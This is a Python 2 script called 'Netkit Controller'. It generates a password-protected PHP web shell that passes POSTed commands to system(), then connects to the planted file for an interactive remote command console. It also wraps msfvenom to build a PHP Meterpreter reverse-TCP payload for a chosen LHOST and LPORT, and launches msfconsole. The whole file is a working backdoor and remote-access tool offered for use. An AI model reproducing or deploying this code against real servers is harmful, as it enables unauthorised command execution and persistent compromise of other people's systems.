#!/usr/bin/python
import time,base64,urllib2,os,urllib,sys
from Crypto.Hash import MD5
h = MD5.new()

msfip = ""
msfport = ""
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
kare = "#                                                                            #"
kena = "##############################################################################"
logo = "#                              Netkit Controller                             #"
print kena
a = 1
while a < 5:
    print kare
    time.sleep(0.1)
    if(a == 2):
        print logo.center(40,"#")
    a = a + 1
print kena
connect = 0
if len(sys.argv) == 4:
    if sys.argv[1] != "":
	if sys.argv != "--help":
	    sta = sys.argv[1] #Generate or connect
    if sys.argv[2] != "":
	sta2 = sys.argv[2] #Backdoor filename or http
    if sys.argv[3] != "":
        sta3 = sys.argv[3] #Password
        h.update(bytearray(sta3))
        mdpassword = h.hexdigest()
	if sta == "--generate":
	    fqx = open(sta2, "w")
	    fqx.write('<?php error_reporting(0); $pass = "'+mdpassword+'"; $password = $_POST["pass"]; $password = md5($password); $cmd = $_POST["cmd"]; $delback = $_POST["delself"]; if(isset($password)){ if($pass == $password) { if(isset($cmd)){ system($cmd); } }else{ print "Password"; } } ?>')
	    print "Netkit Backdoor File created in "+os.getcwd()+sta2
	elif sta == "--connect":
	    if sta2 == "" or sta3 == "":
		print bcolors.FAIL + "You must write url and password value" + bcolors.ENDC
	    try:
		urllib2.urlopen(sta2)
		data = urllib.urlencode({'pass'  : sta3})
		req = urllib2.Request(sta2, data)
		response = urllib2.urlopen(req)
		if response.read() == "Password":
		    print bcolors.FAIL + "Password is not True !" + bcolors.ENDC
		else:
		    cmd = "uname -a"
		    urllib2.urlopen(sta2)
		    data = urllib.urlencode({'cmd' : cmd, 'pass'  : sta3})
		    req = urllib2.Request(sta2, data)
		    response = urllib2.urlopen(req)
		    cmd2 = "whoami"
		    urllib2.urlopen(sta2)
		    data2 = urllib.urlencode({'cmd' : cmd2, 'pass'  : sta3})
		    req2 = urllib2.Request(sta2, data2)
		    response2 = urllib2.urlopen(req2)
		    print "###################\n"
		    print bcolors.BOLD + "[+] Target : " + bcolors.ENDC+sta2
		    print bcolors.BOLD + "[+] Server : " + bcolors.ENDC+response.read()
		    print bcolors.BOLD + "[+] Whoami : " + bcolors.ENDC+response2.read()
		    print "###################"
		    while True:
			rcmd = raw_input(bcolors.BOLD+bcolors.FAIL+"netkit Console > " +bcolors.ENDC)
			if rcmd == "delself": #Delete backdoor
			    urllib2.urlopen(sta2)
			    data = urllib.urlencode({'delself' : "1", 'pass'  : sta3})
			    req = urllib2.Request(sta2, data)
			    print "Succesfully"
			    break
			elif rcmd == "exit": #Exit Control Panel
			    break
			elif rcmd == "clear": # Clear Terminal
			    os.system("clear")
			elif rcmd == "help": # Help Menu
			    print bcolors.BOLD + """
			    netkit generate backdoor.php abc123
			    netkit connect http://localhost/backdoor.php abc123
			    generate : For a generate backdoor
			    connect : For a connect backdoor"""	 + bcolors.ENDC
			elif rcmd == "msfgenerate":
			    if msfip == "" and msfport == "":
				print bcolors.BOLD + bcolors.FAIL +"""You have not defined local ip or port""", bcolors.ENDC,"""
    set msfip <LHOST>
    set msfport <LPORT>""" + bcolors.ENDC
			    else:
				os.system("msfvenom -p php/meterpreter_reverse_tcp LHOST="+msfip+" LPORT="+msfport+" -f raw > msfshell.php")
			elif rcmd == "set msfip":
			    msfip = raw_input("LHOST : ")
			elif rcmd == "set msfport":
			    msfport = raw_input("LPORT : ")
			elif rcmd == "msfoptions":
			    print """
			   Name   Current Setting
			   ----   ---------------
			   LHOST  """+msfip+"""
			   LPORT  """+msfport+"""
			"""
			elif rcmd == "msfconnect":
			    os.system("msfconsole")
			elif rcmd != "": # CMD command
			    urllib2.urlopen(sta2)
			    data = urllib.urlencode({'cmd' : rcmd, 'pass'  : sta3})
			    req = urllib2.Request(sta2, data)
			    response = urllib2.urlopen(req)
			    print response.read()

	    except urllib2.HTTPError as err:
		if err.code == 404:
		    print "File Not Found" # File Not Found
		else:
		    raise
elif len(sys.argv) == 2:
    if sys.argv[1] == "--help": # Help Menu NO Connected
	print bcolors.BOLD + """
	netkit --generate <filename> <password>
	netkit --connect <url> <password>
netkit --generate backdoor.php abc123
netkit --connect http://localhost/netkit/backdoor.php abc123
netkit --help
""" + bcolors.ENDC
else:
    print bcolors.BOLD + bcolors.FAIL + "You entered the missing parameter..." + bcolors.ENDC
